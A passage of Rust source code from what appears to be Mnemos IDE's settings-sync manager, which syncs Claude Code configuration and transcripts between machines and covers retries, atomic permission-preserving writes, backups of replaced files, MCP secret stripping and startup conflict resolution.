        if sweep {
            match sync.sweep_push().await {
                // The sweep uploaded these too.
                Ok(()) => paths.clear(),
                Err(e) => {
                    log_upload_failure("sweep", &e);
                    sweep_owed = is_transient(&e);
                }
            }
        } else if (pull && !pull_first) || index.is_some() || resweep {
            // Every cycle that pulls first pushes what changed since its
            // last push: sessions of a project whose checkout was learned
            // while the app runs, and lines a failed upload left behind.
            // Cheap when nothing changed.
            if let Err(e) = sync.sweep_changed().await {
                log_upload_failure("sweep", &e);
                sweep_owed = is_transient(&e);
            }
        }
        if !paths.is_empty() {
            // Retried by path, not by a sweep: a sweep passes over a file
            // written in the last minute, which the one that just failed
            // usually is.
            if let Err(e) = sync.push_changed(paths.iter().cloned().collect()).await {
                log_upload_failure("push", &e);
                if is_transient(&e) {
                    owed_paths = paths;
                }
            }
        }
        push_failures = if sweep_owed || !owed_paths.is_empty() {
            push_failures + 1
        } else {
            0
        };
        if pull && !pull_first {
            pulled_everything = run_transcript_pull(&manager, &sync).await;
        }
        // A full pull that went through already brought in whatever the
        // index names.
        if let Some(index) = index.filter(|_| !pulled_everything) {
            if let Err(e) = sync.pull_indexed(&index).await {
                tracing::warn!(target: "mnemos_ide_sync::manager", "transcript index pull failed: {e:#}");
            }
        }
        match manager.push_session_index(&sync, &push_state).await {
            Ok(()) => index_failures = 0,
            Err(e) => {
                // A conflict the CAS retries could not settle (the other
                // machine writing as often) gets the timer too: the index
                // never falls back to a blind write.
                if is_transient(&e) || matches!(e, IdeError::CasConflict { .. }) {
                    index_failures += 1;
                } else {
                    index_failures = 0;
                }
                // Once per outage, not on every retry.
                if index_failures <= 1 {
                    tracing::warn!(
                        target: "mnemos_ide_sync::manager",
                        "session index update failed; it stays owed: {e:#}",
                    );
                }
            }
        }
    }
}

/// One full transcript pull for [`run_transcript_worker`]; whether it went
/// through. Over, failed or not, it reports the first pull of the run done.
async fn run_transcript_pull(manager: &SyncManager, sync: &TranscriptSync) -> bool {
    let ok = match sync.pull().await {
        Ok(()) => true,
        Err(e) => {
            tracing::warn!(target: "mnemos_ide_sync::manager", "transcript pull failed: {e:#}");
            false
        }
    };
    manager
        .status_tx
        .send_if_modified(|s| !std::mem::replace(&mut s.first_transcript_pull_done, true));
    ok
}

/// The scopes pushed once at startup, before per-project memory keys.
/// `workspace_state.json` is deliberately absent: it is local-only.
/// Whether a gated key's value is a platform envelope.
fn gate_platform_specific(key: &str) -> bool {
    key == CLAUDE_JSON_MCP_SYNC_KEY
        || DIRECTORIES
            .iter()
            .find(|d| d.sync_key == key)
            .map(|d| d.platform_specific)
            .or_else(|| {
                GLOBAL_FILES
                    .iter()
                    .find(|f| f.sync_key == key)
                    .map(|f| f.platform_specific)
            })
            .unwrap_or(false)
}

/// This machine's slot of a gated key's value (`None`: the envelope has no
/// slot for this platform).
fn gate_slot(key: &str, value: &Value) -> Option<Value> {
    if gate_platform_specific(key) {
        value.get(current_platform()).cloned()
    } else {
        Some(value.clone())
    }
}

/// `value` with this machine's slot replaced by `slot`.
fn with_gate_slot(key: &str, mut value: Value, slot: Value) -> Value {
    if !gate_platform_specific(key) {
        return slot;
    }
    if let Some(obj) = value.as_object_mut() {
        obj.insert(current_platform().to_string(), slot);
    }
    value
}

/// The push scope of a sync key, for a push a gate change asks for.
fn scope_for_key(key: &str) -> Option<DebounceScope> {
    if key == CLAUDE_JSON_MCP_SYNC_KEY {
        return Some(DebounceScope::ClaudeJsonMcp);
    }
    if let Some(f) = GLOBAL_FILES.iter().find(|f| f.sync_key == key) {
        return Some(DebounceScope::GlobalFile(f.sync_key));
    }
    DIRECTORIES
        .iter()
        .find(|d| d.sync_key == key)
        .map(|d| DebounceScope::Directory(d.sync_key))
}

fn initial_push_scopes() -> Vec<DebounceScope> {
    // Mnemos data files
    let mut scopes = vec![
        DebounceScope::Projects,
        DebounceScope::Settings,
        DebounceScope::MnemosSettingsToml,
    ];
    // ~/.claude global files
    scopes.extend(
        GLOBAL_FILES
            .iter()
            .map(|f| DebounceScope::GlobalFile(f.sync_key)),
    );
    // ~/.claude.json mcpServers
    scopes.push(DebounceScope::ClaudeJsonMcp);
    // ~/.claude/<dir>/
    scopes.extend(
        DIRECTORIES
            .iter()
            .map(|d| DebounceScope::Directory(d.sync_key)),
    );
    scopes
}

/// The hash `last_local_mcp_hash` is kept in: one spelling for push and
/// pull (`serde_json` maps are ordered, so key order in the file does not
/// matter). Of the value as pushed, without `env` and `headers`, so a
/// local file that has them hashes like the server slot that does not.
fn mcp_servers_hash(mcp: &Value) -> String {
    sha256_hex(strip_mcp_secrets(mcp).to_string().as_bytes())
}

/// `mcpServers` without each server's `env` and `headers`
/// ([`MCP_SECRET_FIELDS`]). Anything that is not a server object is kept
/// as is.
fn strip_mcp_secrets(mcp: &Value) -> Value {
    let Some(servers) = mcp.as_object() else {
        return mcp.clone();
    };
    let stripped = servers
        .iter()
        .map(|(name, server)| {
            let server = match server.as_object() {
                Some(fields) => Value::Object(
                    fields
                        .iter()
                        .filter(|(k, _)| !MCP_SECRET_FIELDS.contains(&k.as_str()))
                        .map(|(k, v)| (k.clone(), v.clone()))
                        .collect(),
                ),
                None => server.clone(),
            };
            (name.clone(), server)
        })
        .collect();
    Value::Object(stripped)
}

/// A pulled `mcpServers` slot with the `env` and `headers` each server has
/// in `local` put back, so applying it never removes a secret from this
/// machine. A server new to this machine arrives without them.
fn with_local_mcp_secrets(pulled: &Value, local: Option<&Value>) -> Value {
    let (Some(servers), Some(local)) = (pulled.as_object(), local.and_then(Value::as_object))
    else {
        return pulled.clone();
    };
    let mut out = servers.clone();
    for (name, server) in out.iter_mut() {
        let (Some(fields), Some(here)) = (
            server.as_object_mut(),
            local.get(name).and_then(Value::as_object),
        ) else {
            continue;
        };
        for field in MCP_SECRET_FIELDS {
            if !fields.contains_key(*field) {
                if let Some(v) = here.get(*field) {
                    fields.insert((*field).to_string(), v.clone());
                }
            }
        }
    }
    Value::Object(out)
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut h = Sha256::new();
    h.update(bytes);
    let out = h.finalize();
    let mut s = String::with_capacity(64);
    for b in out {
        use std::fmt::Write;
        let _ = write!(s, "{b:02x}");
    }
    s
}

/// Replace `path` with `bytes` through a temp file and a rename, so a reader
/// never sees half a file.
///
/// On unix the new file keeps the permissions of the one it replaces (a
/// fresh temp file would otherwise turn `~/.claude/.env` from 0600 into 0644
/// and strip the exec bit from every hook), healed by [`healed_mode`]; a
/// new script is 0755 and a new `.env` 0600.
async fn atomic_write(path: &Path, bytes: &[u8]) -> Result<(), IdeError> {
    let tmp = match path.file_name() {
        Some(name) => path.with_file_name(format!(".{}.tmp", name.to_string_lossy())),
        None => return Err(IdeError::Other(format!("no filename in {:?}", path))),
    };
    if let Some(parent) = path.parent() {
        tokio::fs::create_dir_all(parent).await.ok();
    }
    #[cfg(unix)]
    let mode = target_mode(path, bytes).await;
    let mut open = tokio::fs::OpenOptions::new();
    open.write(true).create(true).truncate(true);
    // Created with its final mode, so a secret never sits in a wider file
    // for the moment before the chmod below (the umask can only narrow it).
    #[cfg(unix)]
    if let Some(mode) = mode {
        open.mode(mode);
    }
    let write = async {
        use tokio::io::AsyncWriteExt;
        let mut file = open.open(&tmp).await?;
        file.write_all(bytes).await?;
        file.flush().await
    };
    write
        .await
        .map_err(|e| IdeError::Other(format!("write {:?}: {e}", tmp)))?;
    // Exact, whatever the umask or a stale temp file left behind.
    #[cfg(unix)]
    if let Some(mode) = mode {
        use std::os::unix::fs::PermissionsExt;
        tokio::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(mode))
            .await
            .ok();
    }
    tokio::fs::rename(&tmp, path)
        .await
        .map_err(|e| IdeError::Other(format!("rename {:?}: {e}", path)))?;
    Ok(())
}

/// A file's size and modification time, to notice that something wrote it
/// between two points. `None` when it cannot be read.
async fn file_stamp(path: &Path) -> Option<(u64, Option<SystemTime>)> {
    let meta = tokio::fs::metadata(path).await.ok()?;
    Some((meta.len(), meta.modified().ok()))
}

/// The mode [`atomic_write`] gives the file it writes to `path`. `None`
/// leaves the process default (a new file that is neither a script nor
/// `.env`).
#[cfg(unix)]
async fn target_mode(path: &Path, bytes: &[u8]) -> Option<u32> {
    use std::os::unix::fs::PermissionsExt;
    let script = bytes.starts_with(b"#!");
    match tokio::fs::metadata(path).await {
        Ok(meta) => Some(healed_mode(path, bytes, meta.permissions().mode() & 0o7777)),
        Err(_) if script => Some(0o755),
        Err(_) if path.file_name().is_some_and(|n| n == ".env") => Some(0o600),
        Err(_) => None,
    }
}

/// `mode` plus an exec bit for every class that can read: 0644 -> 0755,
/// 0600 -> 0700. A script is never made readable to anyone new.
#[cfg(unix)]
fn with_exec_bits(mode: u32) -> u32 {
    mode | ((mode & 0o444) >> 2)
}

/// The mode a file at `path` holding `bytes` should have, given its current
/// `mode`, undoing what an older build's writes did: `.env` (secrets) is
/// capped at 0600, and a script (`#!`) gets [`with_exec_bits`].
#[cfg(unix)]
fn healed_mode(path: &Path, bytes: &[u8], mode: u32) -> u32 {
    if path.file_name().is_some_and(|n| n == ".env") {
        mode & 0o600
    } else if bytes.starts_with(b"#!") {
        with_exec_bits(mode)
    } else {
        mode
    }
}

/// A file that already holds the right bytes still gets the mode
/// [`atomic_write`] would have given it (see [`healed_mode`]): an identical
/// write is skipped.
#[cfg(unix)]
async fn heal_mode(path: &Path, bytes: &[u8], meta: &std::fs::Metadata) {
    use std::os::unix::fs::PermissionsExt;
    let mode = meta.permissions().mode() & 0o7777;
    let healed = healed_mode(path, bytes, mode);
    if healed != mode {
        tokio::fs::set_permissions(path, std::fs::Permissions::from_mode(healed))
            .await
            .ok();
    }
}

/// How a pulled directory value treats local files it does not list.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ApplyMode {
    /// The value is the whole truth: a local file the key syncs that the
    /// value lacks is set aside in the backups. For a later pull of a key
    /// that moved on the server.
    Mirror,
    /// Nothing is set aside for being absent: the value was already
    /// resolved against the local files (the startup pull, the team pull).
    NoDelete,
}

/// Where a pull puts every file it replaces or removes, so nothing it does
/// is lost: `~/.claude/backups/tcb-sync-<date>/` (an on-disk name kept
/// through the Mnemos IDE rename, where people look for clobbered files),
/// each file at its place under `~/.claude` (`home/.claude.json` for
/// `~/.claude.json`, `mnemos/` for Mnemos's own settings files), and
/// `server/` for server copies a pull chose not to apply. Never watched or synced itself.
#[derive(Debug, Clone)]
struct Backups {
    claude_dir: PathBuf,
    claude_json: PathBuf,
    root: PathBuf,
}

impl Backups {
    fn new(paths: &Paths) -> Self {
        let date = chrono::Local::now().format("%Y-%m-%d");
        Self {
            claude_dir: paths.claude_dir.clone(),
            claude_json: paths.claude_json.clone(),
            root: paths
                .claude_dir
                .join("backups")
                .join(format!("tcb-sync-{date}")),
        }
    }

    /// Where a backup of `path` belongs (it may be taken already).
    fn slot(&self, path: &Path) -> PathBuf {
        if let Ok(rel) = path.strip_prefix(&self.claude_dir) {
            return self.root.join(rel);
        }
        if path == self.claude_json {
            return self.root.join("home").join(".claude.json");
        }
        let name = path
            .file_name()
            .map(|n| n.to_os_string())
            .unwrap_or_else(|| "unnamed".into());
        self.root.join("mnemos").join(name)
    }

    /// Keep `current` (the bytes of `path` about to be overwritten).
    async fn copy(&self, path: &Path, current: &[u8]) -> Result<PathBuf, IdeError> {
        write_backup(self.slot(path), current)
            .await
            .map_err(|e| IdeError::Other(format!("back up {path:?}: {e}")))
    }

    /// Move `path` out of the way: a removal, or a link about to be replaced
    /// by a file. Never deletes it without a copy in the backups.
    async fn take(&self, path: &Path) -> Result<PathBuf, IdeError> {
        let dest = free_slot(self.slot(path));
        if let Some(parent) = dest.parent() {
            tokio::fs::create_dir_all(parent)
                .await
                .map_err(|e| IdeError::Other(format!("create {parent:?}: {e}")))?;
        }
        let renamed = tokio::fs::rename(path, &dest).await;
        if renamed.is_ok() {
            return Ok(dest);
        }
        // Across volumes, or refused: copy, and remove the original only
        // once the copy is in place.
        let meta = tokio::fs::symlink_metadata(path)
            .await
            .map_err(|e| IdeError::Other(format!("stat {path:?}: {e}")))?;
        if !meta.is_file() {
            return Err(IdeError::Other(format!(
                "move {path:?} to the backups: {}",
                renamed.unwrap_err()
            )));
        }
        let bytes = tokio::fs::read(path)
            .await
            .map_err(|e| IdeError::Other(format!("read {path:?}: {e}")))?;
        let dest = write_backup(self.slot(path), &bytes)
            .await
            .map_err(|e| IdeError::Other(format!("back up {path:?}: {e}")))?;
        tokio::fs::remove_file(path)
            .await
            .map_err(|e| IdeError::Other(format!("remove {path:?} after backing it up: {e}")))?;
        Ok(dest)
    }

    /// Keep the whole server value of a single-file key a pull did not apply
    /// (`server/<key>.json`, 0600: it can hold `.env`).
    async fn keep_server_value(&self, key: &str, value: &Value) -> Result<PathBuf, IdeError> {
        let bytes = serde_json::to_vec_pretty(value)?;
        let name = format!("{}.json", key.replace([':', '/', '\\'], "_"));
        write_backup(self.root.join("server").join(name), &bytes)
            .await
            .map_err(|e| IdeError::Other(format!("keep the server copy of {key}: {e}")))
    }

    /// Keep the server's copy of `rel` of `key`, which a pull did not apply
    /// (the local copy changed too). `rel` is a normalized relative path, or
    /// a file name for a single-file key.
    async fn keep_server_copy(
        &self,
        key: &str,
        rel: &str,
        bytes: &[u8],
    ) -> Result<PathBuf, IdeError> {
        let key_dir = key.replace([':', '/', '\\'], "_");
        write_backup(self.root.join("server").join(key_dir).join(rel), bytes)
            .await
            .map_err(|e| IdeError::Other(format!("keep the server copy of {key}/{rel}: {e}")))
    }
}

/// `slot`, or a sibling named after it that nothing occupies yet: an
/// earlier backup is never overwritten.
fn free_slot(slot: PathBuf) -> PathBuf {
    if std::fs::symlink_metadata(&slot).is_err() {
        return slot;
    }
    let stamp = chrono::Local::now().format("%H%M%S").to_string();
    let name = slot
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    for n in 1..1000 {
        let candidate = if n == 1 {
            format!("{name}-{stamp}")
        } else {
            format!("{name}-{stamp}-{n}")
        };
        let path = slot.with_file_name(candidate);
        if std::fs::symlink_metadata(&path).is_err() {
            return path;
        }
    }
    slot.with_file_name(format!("{name}-{}", uuid::Uuid::new_v4()))
}

/// Write `bytes` as a new backup file at `slot` (or a free sibling), 0600 on
/// unix: backups hold `.env` and `~/.claude.json`. A backup there already
/// holding exactly `bytes` is reused, so a write retried on every poll
/// keeps one copy instead of one per attempt.
async fn write_backup(slot: PathBuf, bytes: &[u8]) -> std::io::Result<PathBuf> {
    use tokio::io::AsyncWriteExt;
    if let Some(parent) = slot.parent() {
        tokio::fs::create_dir_all(parent).await?;
    }
    if let Some(existing) = identical_backup(&slot, bytes) {
        return Ok(existing);
    }
    let mut path = free_slot(slot);
    for _ in 0..3 {
        let mut open = tokio::fs::OpenOptions::new();
        open.write(true).create_new(true);
        #[cfg(unix)]
        open.mode(0o600);
        match open.open(&path).await {
            Ok(mut file) => {
                file.write_all(bytes).await?;
                file.flush().await?;
                return Ok(path);
            }
            // Taken between the check and the create.
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => path = free_slot(path),
            Err(e) => return Err(e),
        }
    }
    Err(std::io::Error::other("no free backup name"))
}

/// A plain file at `slot`, or at a sibling [`free_slot`] named after it,
/// that holds exactly `bytes`. Links are not followed.
fn identical_backup(slot: &Path, bytes: &[u8]) -> Option<PathBuf> {
    let name = slot.file_name()?.to_string_lossy().into_owned();
    let sibling = format!("{name}-");
    for entry in std::fs::read_dir(slot.parent()?).ok()?.flatten() {
        let entry_name = entry.file_name().to_string_lossy().into_owned();
        if entry_name != name && !entry_name.starts_with(&sibling) {
            continue;
        }
        // `DirEntry::metadata` does not traverse a link.
        let Ok(meta) = entry.metadata() else { continue };
        if !meta.is_file() || meta.len() != bytes.len() as u64 {
            continue;
        }
        if std::fs::read(entry.path()).is_ok_and(|held| held == bytes) {
            return Some(entry.path());
        }
    }
    None
}

/// Write `bytes` to `path` unless it already holds exactly them, backing up
/// what it replaces first. When the backup fails nothing is written.
/// Returns whether the file was written.
async fn replace_file(path: &Path, bytes: &[u8], backups: &Backups) -> Result<bool, IdeError> {
    match tokio::fs::symlink_metadata(path).await {
        // A link is never written through: it is set aside whole, and a
        // plain file takes its place.
        Ok(meta) if meta.file_type().is_symlink() => {
            if tokio::fs::read(path)
                .await
                .is_ok_and(|current| current == bytes)
            {
                return Ok(false);
            }
            backups.take(path).await?;
        }
        Ok(meta) if meta.is_file() => {
            let current = tokio::fs::read(path)
                .await
                .map_err(|e| IdeError::Other(format!("read {path:?}: {e}")))?;
            if current == bytes {
                #[cfg(unix)]
                heal_mode(path, bytes, &meta).await;
                return Ok(false);
            }
            backups.copy(path, &current).await?;
        }
        Ok(_) => {
            return Err(IdeError::Other(format!(
                "{path:?} is not a file; not replaced"
            )))
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => return Err(IdeError::Other(format!("stat {path:?}: {e}"))),
    }
    atomic_write(path, bytes).await?;
    Ok(true)
}

/// What this machine last had in sync with the server, per key: the
/// version, and for a directory key a hash of each file of this machine's
/// slot. The startup pull compares against it to tell which side changed a
/// file while this machine was not syncing. Kept in
/// `<Mnemos store>/sync_baseline.json`, written only when it changes.
#[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
struct Baseline {
    #[serde(default, rename = "profileId")]
    profile_id: Option<String>,
    #[serde(default)]
    keys: BTreeMap<String, BaselineEntry>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
struct BaselineEntry {
    version: i64,
    /// Directory keys: relative path -> SHA-256 of the file's bytes.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    files: BTreeMap<String, String>,
    /// Single-file keys: [`file_key_value_hash`] of the synced value.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    sha256: Option<String>,
}

/// Keys synced as one local file (or one slot of `~/.claude.json`).
fn is_single_file_key(key: &str) -> bool {
    key == CLAUDE_JSON_MCP_SYNC_KEY
        || key == "settings"
        || key == SETTINGS_V2_KEY
        || GLOBAL_FILES.iter().any(|f| f.sync_key == key)
}

/// A hash of what a single-file key's server `value` puts on this machine,
/// in a form independent of formatting: the text of a raw file, the
/// compact JSON of a JSON file (platform-specific: this platform's slot,
/// with leaked envelope keys stripped), and [`mcp_servers_hash`] of this
/// platform's mcpServers. `None` when the value holds nothing for this
/// machine.
fn file_key_value_hash(key: &str, value: &Value) -> Option<String> {
    if key == CLAUDE_JSON_MCP_SYNC_KEY {
        return value
            .get(current_platform())
            .filter(|slot| slot.is_object())
            .map(mcp_servers_hash);
    }
    if key == "settings" {
        return Some(sha256_hex(value.to_string().as_bytes()));
    }
    if key == MNEMOS_USER_SETTINGS_KEY {
        return value.as_str().map(|text| sha256_hex(text.as_bytes()));
    }
    let cfg = GLOBAL_FILES.iter().find(|f| f.sync_key == key)?;
    let value = if cfg.platform_specific {
        value.get(current_platform())?
    } else {
        value
    };
    if cfg.raw {
        return value.as_str().map(|text| sha256_hex(text.as_bytes()));
    }
    let value = if cfg.platform_specific {
        strip_nested_platform_keys(value.clone())
    } else {
        value.clone()
    };
    Some(sha256_hex(value.to_string().as_bytes()))
}

/// A directory key's flat `relative/path -> base64` map.
type DirMap = serde_json::Map<String, Value>;

/// What a push offers the server, turned into the value to merge on each
/// CAS attempt, against that attempt's server copy.
enum LocalValue {
    /// The key's whole value, as is.
    Whole(Value),
    /// This machine's slot of a platform-envelope key; the other slots are
    /// taken from each attempt's server copy.
    PlatformSlot(Value),
    /// A directory key's files (with its `__deleted`): this machine's slot
    /// for a platform-specific key, else the whole value. Each attempt first
    /// settles them against the server's tombstones, and wraps this slot in
    /// the server's current envelope.
    Directory {
        cfg: &'static DirectorySync,
        files: DirMap,
        /// Files the watcher saw exist again: never settled away.
        revived: BTreeSet<String>,
    },
    /// The synced settings of `settings.toml`, laid over each attempt's
    /// server copy (`settings_toml::outgoing`).
    Settings(SyncedSettings),
}

/// The platform slots of an envelope value (`{}` for anything else).
fn platform_slots_of(value: &Value) -> DirMap {
    value
        .as_object()
        .map(|obj| {
            obj.iter()
                .filter(|(k, _)| PLATFORM_KEYS.contains(&k.as_str()))
                .map(|(k, v)| (k.clone(), v.clone()))
                .collect()
        })
        .unwrap_or_default()
}

/// Whether `rel` names a file a directory key syncs: one of its extensions,
/// and [`syncs_rel`].
fn is_synced_file_name(cfg: &DirectorySync, rel: &str) -> bool {
    let ext = Path::new(rel)
        .extension()
        .and_then(|e| e.to_str())
        .map(str::to_ascii_lowercase);
    ext.is_some_and(|ext| cfg.extensions.contains(&ext.as_str())) && syncs_rel(cfg, rel)
}

/// The flat `relative/path -> base64` map this machine applies from a
/// directory key's value: the object itself, or this platform's slot of a
/// platform envelope. `None` when there is nothing for this machine.
fn dir_slot<'a>(
    cfg: &DirectorySync,
    value: &'a Value,
) -> Option<&'a serde_json::Map<String, Value>> {
    if cfg.platform_specific {
        value.get(current_platform())?.as_object()
    } else {
        value.as_object()
    }
}

/// SHA-256 of each file in a directory map (entries that are not base64
/// strings are skipped).
fn dir_hashes(map: &serde_json::Map<String, Value>) -> BTreeMap<String, String> {
    map.iter()
        .filter_map(|(rel, b64)| {
            let bytes = B64.decode(b64.as_str()?).ok()?;
            Some((rel.clone(), sha256_hex(&bytes)))
        })
        .collect()
}

/// Resolve a startup pull of a directory key file by file against the local
/// files (`local`) and the last sync (`baseline`, rel -> hash). Returns the
/// map to write (with nothing deleted) and the server copies that were not
/// applied because the local copy won.
///
/// For a file both sides have with different bytes:
/// - local unchanged since the last sync: the server's copy is written;
/// - server unchanged since then: the local copy stays, for the push;
/// - both changed, or no baseline entry: nothing says the local copy is an
///   edit (a first start, or a stale baseline, sees the other machine's
///   newer edit the same way). `local_wins(rel)` decides: when it holds, the
///   local copy stays and the server's is returned to be kept in the
///   backups; otherwise the server's copy is written, and writing it backs
///   up the local one.
///
/// A file only the server has is written; one only this machine has stays.
fn resolve_startup_dir(
    local: &DirMap,
    server: &DirMap,
    baseline: Option<&BTreeMap<String, String>>,
    local_wins: impl Fn(&str) -> bool,
) -> (DirMap, Vec<(String, Vec<u8>)>) {
    let mut resolved = server.clone();
    let mut set_aside = Vec::new();
    let hash = |b64: &Value| {
        b64.as_str()
            .and_then(|s| B64.decode(s).ok())
            .map(|bytes| sha256_hex(&bytes))
    };
    for (rel, local_b64) in local {
        let Some(server_b64) = server.get(rel) else {
            continue;
        };
        if server_b64 == local_b64 || !server_b64.is_string() {
            continue;
        }
        let base = baseline.and_then(|b| b.get(rel));
        if base.is_some() && base == hash(local_b64).as_ref() {
            continue;
        }
        let changed_only_here = base.is_some() && base == hash(server_b64).as_ref();
        if !changed_only_here && !local_wins(rel) {
            continue;
        }
        resolved.insert(rel.clone(), local_b64.clone());
        if !changed_only_here {
            if let Some(bytes) = server_b64.as_str().and_then(|s| B64.decode(s).ok()) {
                set_aside.push((rel.clone(), bytes));
            }
        }
    }
    (resolved, set_aside)
}

/// When the server last wrote `state`'s key (its `synced_at`), in ms since
/// the epoch. `None` when the server sent no readable time.
fn server_written_ms(state: &SyncStateResponse) -> Option<i64> {
    registry::parse_timestamp(&state.synced_at).map(|t| t.timestamp_millis())
}

/// Whether the file at `path` was modified after `server_ms` (a key's
/// `synced_at`). False when either time is unknown.
fn modified_after(path: &Path, server_ms: Option<i64>) -> bool {
    let Some(server_ms) = server_ms else {
        return false;
    };
    std::fs::metadata(path)
        .and_then(|m| m.modified())
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .is_some_and(|since| since.as_millis() as i64 > server_ms)
}

/// The files a directory key syncs under `dir`, as `(relative/path, path)`
/// with forward slashes: matching extension, no larger than the key's
/// limit, outside the skipped dirs. Push and pull agree on this set, so a
/// file the key never sends is never mirrored away either.
fn synced_files(dir: &Path, cfg: &DirectorySync) -> Vec<(String, PathBuf)> {
    let mut out = Vec::new();
    let mut stack: Vec<PathBuf> = vec![dir.to_path_buf()];
    while let Some(current) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&current) else {
            continue;
        };
        let top_level = current == dir;
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if SKIP_DIR_NAMES.contains(&name_str.as_ref())
                || name_str.starts_with('.')
                || (top_level && cfg.skip_top_level.contains(&name_str.as_ref()))
            {
                continue;
            }
            let path = entry.path();
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if file_type.is_dir() {
                stack.push(path);
                continue;
            }
            if !file_type.is_file() {
                continue;
            }
            let ext = path
                .extension()
                .and_then(|s| s.to_str())
                .map(|s| s.to_ascii_lowercase());
            let Some(ext) = ext else {
                continue;
            };
            if !cfg.extensions.iter().any(|e| *e == ext) {
                continue;
            }
            let Ok(meta) = entry.metadata() else { continue };
            if meta.len() > cfg.max_bytes {
                continue;
            }
            let rel = match path.strip_prefix(dir) {
                Ok(r) => r.to_string_lossy().replace('\\', "/"),
                Err(_) => continue,
            };
            out.push((rel, path));
        }
    }
    out
}

/// Whether a directory key syncs the file at `rel` (a normalized relative
/// path): nothing under a dot-prefixed name or a skipped dir at any level,
/// nothing under the key's skipped top-level entries. Applied to what the
/// server sends as well as to what is pushed, so an older build's copy of
/// Claude Code's skill cache is neither written here nor kept on the
/// server.
fn syncs_rel(cfg: &DirectorySync, rel: &str) -> bool {
    if rel
        .split('/')
        .next()
        .is_some_and(|first| cfg.skip_top_level.contains(&first))
    {
        return false;
    }
    !rel.split('/')
        .any(|seg| seg.starts_with('.') || SKIP_DIR_NAMES.contains(&seg))
}

/// `value` without the files the key does not sync ([`syncs_rel`]), in
/// every platform slot of an envelope key. The reserved `__deleted` entry
/// stays.
fn without_unsynced_rels(cfg: &DirectorySync, mut value: Value) -> Value {
    let keep = |rel: &String| rel == DIR_TOMBSTONES_KEY || syncs_rel(cfg, &normalize_relative(rel));
    if cfg.platform_specific {
        if let Some(envelope) = value.as_object_mut() {
            for platform in PLATFORM_KEYS {
                if let Some(slot) = envelope.get_mut(platform).and_then(Value::as_object_mut) {
                    slot.retain(|rel, _| keep(rel));
                }
            }
        }
    } else if let Some(map) = value.as_object_mut() {
        map.retain(|rel, _| keep(rel));
    }
    value
}

/// A directory key's local files as a JSON object mapping
/// `relative/path -> base64(content)`. `None` if there are none (or the
/// directory is missing).
fn serialize_directory(dir: &Path, cfg: &DirectorySync) -> Option<Value> {
    if !dir.exists() {
        return None;
    }
    let mut out = serde_json::Map::new();
    for (rel, path) in synced_files(dir, cfg) {
        let Ok(bytes) = std::fs::read(&path) else {
            continue;
        };
        out.insert(rel, Value::String(B64.encode(bytes)));
    }
    if out.is_empty() {
        None
    } else {
        Some(Value::Object(out))
    }
}

/// Write each `relative/path -> base64` entry under `dir`, only where the
/// bytes differ, backing up what it replaces. With [`ApplyMode::Mirror`] a
/// local file the key syncs that `data` lacks is moved to the backups; it
/// is never deleted outright. A file that could not be written or set aside
/// makes the whole apply an `Err`, so the key's version stays unknown and
/// the next pull tries again (what did land is skipped as identical).
async fn deserialize_directory(
    dir: &Path,
    data: &serde_json::Map<String, Value>,
    cfg: &DirectorySync,
    mode: ApplyMode,
    backups: &Backups,
) -> Result<(), IdeError> {
    tokio::fs::create_dir_all(dir).await.ok();
    let tombstones: BTreeMap<String, i64> = data
        .get(DIR_TOMBSTONES_KEY)
        .and_then(Value::as_object)
        .map(|t| {
            t.iter()
                .filter_map(|(rel, at)| Some((normalize_relative(rel), at.as_i64()?)))
                .filter(|(rel, _)| !rel.is_empty() && syncs_rel(cfg, rel))
                .collect()
        })
        .unwrap_or_default();
    let mut remote_paths: HashSet<String> = HashSet::new();
    let mut failed = 0usize;
    for (rel, b64) in data {
        if rel == DIR_TOMBSTONES_KEY {
            continue;
        }
        let normalized = normalize_relative(rel);
        if normalized.is_empty() || !syncs_rel(cfg, &normalized) {
            continue;
        }
        // An older build's union can carry a file and its tombstone.
        if tombstones.contains_key(&normalized) {
            continue;
        }
        remote_paths.insert(normalized.clone());
        let Some(s) = b64.as_str() else { continue };
        let Ok(decoded) = B64.decode(s) else { continue };
        if let Err(e) = replace_file(&dir.join(&normalized), &decoded, backups).await {
            tracing::warn!(target: "mnemos_ide_sync::manager", rel = %normalized, "pulled file not written: {e:#}");
            failed += 1;
        }
    }
    // Deleted on the other machine: set aside unless changed here since.
    // Honored whatever the mode.
    for (rel, at) in &tombstones {
        let path = dir.join(rel);
        match mtime_ms(&path).await {
            Some(local) if local <= *at => {}
            _ => continue,
        }
        match backups.take(&path).await {
            Ok(dest) => tracing::info!(
                target: "mnemos_ide_sync::manager",
                rel,
                backup = %dest.display(),
                "deleted on the other machine; moved to the backups",
            ),
            Err(e) => {
                tracing::warn!(target: "mnemos_ide_sync::manager", rel, "kept a file the other machine deleted: {e:#}");
                failed += 1;
            }
        }
    }
    if mode == ApplyMode::Mirror {
        for (rel, path) in synced_files(dir, cfg) {
            // A copy changed here after the other machine deleted it stays
            // for the next push to bring back.
            if remote_paths.contains(&rel) || tombstones.contains_key(&rel) {
                continue;
            }
            match backups.take(&path).await {
                Ok(dest) => tracing::info!(
                    target: "mnemos_ide_sync::manager",
                    rel,
                    backup = %dest.display(),
                    "removed on the server; moved to the backups",
                ),
                Err(e) => {
                    tracing::warn!(target: "mnemos_ide_sync::manager", rel, "kept a file the server removed: {e:#}");
                    failed += 1;
                }
            }
        }
    }
    if failed > 0 {
        return Err(IdeError::Other(format!(
            "{failed} file(s) under {dir:?} could not be applied"
        )));
    }
    Ok(())
}

/// A relative path from a pulled payload, with forward slashes, or `""`
/// when it could reach outside the directory it is applied under: absolute
/// (`/`, `\`, a drive or any `:`), or with an empty, `.` or `..` segment.
fn normalize_relative(input: &str) -> String {
    let path = input.replace('\\', "/");
